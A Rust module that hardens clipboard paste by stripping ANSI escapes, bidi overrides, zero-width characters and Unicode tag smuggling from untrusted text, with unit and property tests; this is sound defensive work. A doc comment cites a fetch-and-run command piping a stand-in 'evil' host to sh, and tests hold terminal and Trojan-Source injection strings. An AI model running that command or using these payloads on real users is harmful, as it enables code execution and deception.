//! Paste-injection hardening: normalize untrusted clipboard text before a paste sink.
//!
//! Clipboard content is untrusted (a hostile peer sends arbitrary bytes). The wire codec
//! [`ClipboardUpdate::decode`](sh_protocol::ClipboardUpdate::decode) already guarantees the text is
//! valid UTF-8 and ≤ 256 KiB, but *valid `text/plain`* can still carry control and invisible
//! characters crafted to do damage when the victim **pastes** it -- classically into a terminal
//! (ANSI/CSI escape sequences, a lone carriage return that overwrites the rendered line, a
//! bracketed-paste terminator that breaks out of paste mode) or to hide what a pasted command
//! really is (Trojan-Source bidi overrides, zero-width joiners, Unicode "tag" ASCII-smuggling).
//!
//! [`sanitize_clipboard_text`] closes the **control-character / bidi / invisible-smuggling** class
//! decisively while preserving legitimate multi-line, multi-script text. It is the receive-path
//! hardening required by ADR-0037 (Security §6): the wiring MUST run it before
//! [`ClipboardAccess::set_text`](crate::ClipboardAccess::set_text) on both peers.
//!
//! # Residual risks (NOT closed here -- documented honestly, see ADR-0037)
//!
//! - **Social engineering:** a user who pastes attacker-supplied *visible plain-ASCII* text
//!   (`curl evil.sh | sh`) into a shell and presses Enter is not protected by any character filter.
//! - **Embedded newlines into a non-bracketed-paste sink:** LF is deliberately kept, so a
//!   multi-line command still submits line-by-line in a terminal without bracketed paste. The
//!   sanitizer guarantees the payload cannot itself *disable* bracketed paste (ESC is stripped) but
//!   cannot force the sink to support it.
//! - **Homoglyph / confusable spoofing** (Cyrillic `а` in a URL): no confusable folding or
//!   script-mixing restriction (that would break legitimate non-Latin text).
//! - **Sink-specific injection** (e.g. spreadsheet formula injection from a leading `=`/`+`/`-`/`@`):
//!   out of scope for a generic text sanitizer; belongs to the paste-target application.
//! - **Variation selectors** (`U+FE00`–`U+FE0F`) are kept for emoji/CJK fidelity.
//!
//! A future non-text format id (HTML/image) gets its **own** sanitizer + fuzz target; this
//! text-only filter must not be reused for it (ADR-0037 §7).

/// Normalize untrusted clipboard text so it is safe to hand to an OS clipboard / paste sink.
///
/// **Total and infallible:** never panics and never rejects. It only ever *removes* dangerous
/// scalars or *maps line separators shorter*, so the output is always valid UTF-8 and never longer
/// (in bytes) than the input -- the 256 KiB wire bound is preserved without re-checking.
///
/// The transform is a single pass:
///
/// 1. **Line-ending normalization:** `CRLF` and a lone `CR` (`U+000D`) both become a single `LF`
///    (`U+000A`); `U+2028`/`U+2029` (line/paragraph separators) also become `LF`. A bare `CR`
///    overwrites the terminal line, so it is never kept.
/// 2. **Strip filter:** removes C0 controls except `TAB` (`U+0009`) and `LF` (`U+000A`) -- this
///    includes `ESC` (`U+001B`), so no ANSI/CSI/OSC sequence and no bracketed-paste terminator
///    (`ESC[201~`) can survive; `DEL` (`U+007F`); C1 controls (`U+0080`–`U+009F`, incl. the 8-bit
///    `CSI` `U+009B`); bidi controls (`U+202A`–`U+202E`, `U+2066`–`U+2069`, `U+200E`/`U+200F`,
///    `U+061C`) -- the Trojan-Source vector; zero-width and other invisible format characters
///    (`U+200B`–`U+200D`, `U+2060`–`U+2064`, `U+FEFF`, `U+00AD`, `U+180E`, `U+206A`–`U+206F`,
///    `U+FFF9`–`U+FFFB`, `U+1D173`–`U+1D17A`); the Unicode **tag** block (`U+E0000`–`U+E007F`,
///    ASCII-smuggling); and Unicode **noncharacters** (`U+FDD0`–`U+FDEF` and every plane's
///    `*FFFE`/`*FFFF`).
///
/// All printable text -- every script, emoji, `TAB`, and `LF` -- passes through unchanged.
///
/// # Caller obligation — prefer [`sanitize_for_paste`]
///
/// If this returns an **empty** string for a **non-empty** input (the input was entirely control /
/// invisible characters), the caller MUST **skip** the `set_text` write rather than clobber the
/// user's existing local clipboard with an attacker-forced empty value (ADR-0037). This function
/// returns a raw `String` and does not signal that case, so the receive-path wiring should call
/// [`sanitize_for_paste`] instead — it folds the "nothing safe to write → skip" decision into an
/// `Option` that cannot be forgotten.
///
/// # Examples
///
/// ```
/// use sh_clipboard::sanitize_clipboard_text;
///
/// // Plain multi-line text with a tab is preserved exactly.
/// assert_eq!(sanitize_clipboard_text("a\tb\nc"), "a\tb\nc");
/// // A CRLF is normalized to a single LF; an embedded ESC (ANSI escape) is stripped.
/// assert_eq!(sanitize_clipboard_text("ls\r\n\u{1b}[31mred"), "ls\n[31mred");
/// // A Trojan-Source bidi override is removed.
/// assert_eq!(sanitize_clipboard_text("safe\u{202e}reverse"), "safereverse");
/// ```
#[must_use]
pub fn sanitize_clipboard_text(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\r' => {
                // CRLF or a lone CR both collapse to a single LF.
                if chars.peek() == Some(&'\n') {
                    let _ = chars.next();
                }
                out.push('\n');
            }
            // `\r`, U+2028, and U+2029 are the only forbidden scalars that are *normalized* to LF
            // rather than dropped; they are matched here so they never reach the strip guard below.
            '\u{2028}' | '\u{2029}' => out.push('\n'),
            _ if is_forbidden_in_paste_output(c) => {}
            _ => out.push(c),
        }
    }
    out
}

/// Sanitize untrusted clipboard text for a paste sink, returning `None` when there is **nothing
/// safe to write**.
///
/// This is the API the receive-path wiring should use before [`ClipboardAccess::set_text`](crate::ClipboardAccess::set_text):
/// it runs [`sanitize_clipboard_text`] and returns `None` when the result is empty (the input was
/// empty, or was **entirely** control / invisible characters), so the caller cannot accidentally
/// clobber the user's existing local clipboard with an attacker-forced empty value (ADR-0037 §6).
/// `Some(text)` is always non-empty, safe, sanitized text.
///
/// # Examples
///
/// ```
/// use sh_clipboard::sanitize_for_paste;
///
/// assert_eq!(sanitize_for_paste("hello"), Some("hello".to_owned()));
/// // All-control input yields nothing to write → skip the set_text call.
/// assert_eq!(sanitize_for_paste("\u{1b}\u{202e}\u{200b}"), None);
/// assert_eq!(sanitize_for_paste(""), None);
/// ```
#[must_use]
pub fn sanitize_for_paste(input: &str) -> Option<String> {
    let out = sanitize_clipboard_text(input);
    (!out.is_empty()).then_some(out)
}

/// Whether a scalar must **never appear in sanitized paste output** — the single source of truth
/// for both the sanitizer's strip decision and its test/fuzz oracle (so the two cannot drift).
///
/// Returns `true` for the whole control / bidi / invisible-smuggling class **and** for `CR`
/// (`U+000D`), `U+2028`, and `U+2029`: those three are *normalized* to `LF` by
/// [`sanitize_clipboard_text`] rather than dropped, but like the stripped scalars they must never
/// survive verbatim into the output. `TAB` (`U+0009`), `LF` (`U+000A`), all printable text, and
/// variation selectors return `false`.
#[must_use]
pub fn is_forbidden_in_paste_output(c: char) -> bool {
    let u = u32::from(c);
    matches!(u,
        // C0 controls except TAB (0x09) and LF (0x0A) — this range INCLUDES CR (0x0D), which is
        // normalized to LF, and ESC (0x1B), killing every ANSI/CSI/OSC sequence.
        0x00..=0x08 | 0x0B..=0x1F
        | 0x7F                       // DEL
        | 0x80..=0x9F                // C1 controls (incl. NEL 0x85, 8-bit CSI 0x9B)
        | 0xAD                       // SOFT HYPHEN
        | 0x061C                     // ARABIC LETTER MARK (bidi)
        | 0x180E                     // MONGOLIAN VOWEL SEPARATOR
        | 0x2028 | 0x2029            // LINE / PARAGRAPH SEPARATOR (normalized to LF)
        | 0x200B..=0x200F            // ZWSP/ZWNJ/ZWJ + LRM/RLM (bidi marks)
        | 0x202A..=0x202E            // bidi embeddings/overrides (Trojan Source)
        | 0x2060..=0x2064            // WORD JOINER + invisible math operators
        | 0x2066..=0x2069            // bidi isolates (Trojan Source)
        | 0x206A..=0x206F            // deprecated format controls
        | 0xFEFF                     // BOM / ZERO WIDTH NO-BREAK SPACE
        | 0xFFF9..=0xFFFB            // interlinear annotation controls
        | 0xFDD0..=0xFDEF            // noncharacters
        | 0x1D173..=0x1D17A          // musical symbol format controls
        | 0xE0000..=0xE007F          // Tags block (ASCII smuggling)
    ) || (u & 0xFFFE) == 0xFFFE // every plane's *FFFE / *FFFF noncharacters
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::indexing_slicing)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    #[test]
    fn plain_text_is_unchanged() {
        let s = "Hello, world!\nSecond line\twith a tab.\nПривет 世界 🌍";
        assert_eq!(sanitize_clipboard_text(s), s);
    }

    #[test]
    fn keeps_tab_and_lf() {
        assert_eq!(sanitize_clipboard_text("a\tb\nc"), "a\tb\nc");
    }

    #[test]
    fn crlf_becomes_lf() {
        assert_eq!(sanitize_clipboard_text("a\r\nb\r\nc"), "a\nb\nc");
    }

    #[test]
    fn lone_cr_becomes_lf() {
        // A bare CR would carriage-return over the rendered terminal line; never keep it.
        assert_eq!(
            sanitize_clipboard_text("visible\rhidden"),
            "visible\nhidden"
        );
    }

    #[test]
    fn line_and_paragraph_separators_become_lf() {
        assert_eq!(sanitize_clipboard_text("a\u{2028}b\u{2029}c"), "a\nb\nc");
    }

    #[test]
    fn strips_esc_defeating_ansi_and_bracketed_paste_escape() {
        // ESC is stripped, so a forged bracketed-paste terminator can't break out of paste mode,
        // and no CSI colour/cursor sequence survives.
        assert_eq!(
            sanitize_clipboard_text("before\u{1b}[201~after"),
            "before[201~after"
        );
        assert!(!sanitize_clipboard_text("\u{1b}[31mx").contains('\u{1b}'));
    }

    #[test]
    fn strips_bidi_override_trojan_source() {
        assert_eq!(sanitize_clipboard_text("a\u{202e}b\u{202c}c"), "abc");
        assert_eq!(sanitize_clipboard_text("x\u{2066}y\u{2069}z"), "xyz");
    }

    #[test]
    fn strips_zero_width_and_invisible_formats() {
        for cp in [
            '\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}', '\u{00AD}', '\u{2060}', '\u{180E}',
        ] {
            let s = format!("a{cp}b");
            assert_eq!(sanitize_clipboard_text(&s), "ab", "cp=U+{:04X}", cp as u32);
        }
    }

    #[test]
    fn strips_c1_controls() {
        // NEL (0x85) and 8-bit CSI (0x9B) among them.
        assert_eq!(sanitize_clipboard_text("a\u{85}b\u{9b}c"), "abc");
    }

    #[test]
    fn strips_tag_block_ascii_smuggling() {
        // A hidden "cmd" smuggled via the Tags block leaves only the visible text.
        let hidden = "run\u{E0063}\u{E006D}\u{E0064}";
        assert_eq!(sanitize_clipboard_text(hidden), "run");
    }

    #[test]
    fn strips_noncharacters() {
        assert_eq!(sanitize_clipboard_text("a\u{FFFE}b\u{FFFF}c"), "abc");
        assert_eq!(sanitize_clipboard_text("a\u{FDD0}b\u{10FFFF}c"), "abc");
    }

    #[test]
    fn all_control_input_becomes_empty() {
        // Caller obligation: skip set_text on this (non-empty in, empty out).
        let s = "\u{1b}\u{202e}\u{200b}\u{7f}\u{0}";
        assert!(sanitize_clipboard_text(s).is_empty());
    }

    #[test]
    fn keeps_variation_selectors() {
        // VS-15/VS-16 are preserved for emoji/CJK presentation fidelity.
        let s = "\u{2764}\u{FE0F}"; // ❤️ (heart + VS-16)
        assert_eq!(sanitize_clipboard_text(s), s);
    }

    #[test]
    fn strips_range_interiors() {
        // Interior codepoints of each multi-element range must strip too — guards a range being
        // narrowed to only its documented endpoints.
        for cp in [
            '\u{0004}',
            '\u{0015}',
            '\u{008A}',
            '\u{2062}',
            '\u{206C}',
            '\u{FDE0}',
            '\u{1D176}',
            '\u{E0040}',
        ] {
            let s = format!("x{cp}y");
            assert_eq!(sanitize_clipboard_text(&s), "xy", "cp=U+{:04X}", cp as u32);
        }
    }

    #[test]
    fn keeps_scalars_just_past_strip_boundaries() {
        // The first assigned printable just past each strip range must be KEPT — guards over-match.
        for cp in ['\u{FDF0}', '\u{2065}', '\u{E0080}', '\u{FFFD}'] {
            let s = format!("x{cp}y");
            assert_eq!(sanitize_clipboard_text(&s), s, "cp=U+{:04X}", cp as u32);
        }
    }

    #[test]
    fn sanitize_for_paste_skips_empty_and_all_control() {
        assert_eq!(sanitize_for_paste(""), None);
        assert_eq!(sanitize_for_paste("\u{1b}\u{202e}\u{200b}\u{7f}"), None);
        assert_eq!(sanitize_for_paste("ok\ttext"), Some("ok\ttext".to_owned()));
        // Partially-control input still yields the safe remainder.
        assert_eq!(sanitize_for_paste("a\u{202e}b"), Some("ab".to_owned()));
    }

    proptest! {
        /// (1) total: never panics on any input; and (2) no forbidden scalar survives.
        #[test]
        fn total_and_no_forbidden_survives(s in ".*") {
            let out = sanitize_clipboard_text(&s);
            prop_assert!(
                out.chars().all(|c| !is_forbidden_in_paste_output(c)),
                "forbidden scalar survived"
            );
        }

        /// `sanitize_for_paste` returns `Some` iff the sanitized text is non-empty, and that text
        /// equals `sanitize_clipboard_text` (never returns `Some("")`).
        #[test]
        fn sanitize_for_paste_matches_nonempty(s in ".*") {
            let raw = sanitize_clipboard_text(&s);
            match sanitize_for_paste(&s) {
                Some(t) => { prop_assert!(!t.is_empty()); prop_assert_eq!(t, raw); }
                None => prop_assert!(raw.is_empty()),
            }
        }

        /// (3) non-growth: output byte length never exceeds input (preserves the 256 KiB bound).
        #[test]
        fn never_grows(s in ".*") {
            prop_assert!(sanitize_clipboard_text(&s).len() <= s.len());
        }

        /// (4) idempotent: a second pass changes nothing.
        #[test]
        fn idempotent(s in ".*") {
            let once = sanitize_clipboard_text(&s);
            let twice = sanitize_clipboard_text(&once);
            prop_assert_eq!(once, twice);
        }

        /// (5) identity on the safe subset: printable + TAB + LF is returned byte-for-byte.
        #[test]
        fn identity_on_safe_subset(s in "[a-zA-Z0-9 \t\n]*") {
            prop_assert_eq!(sanitize_clipboard_text(&s), s);
        }
    }
}
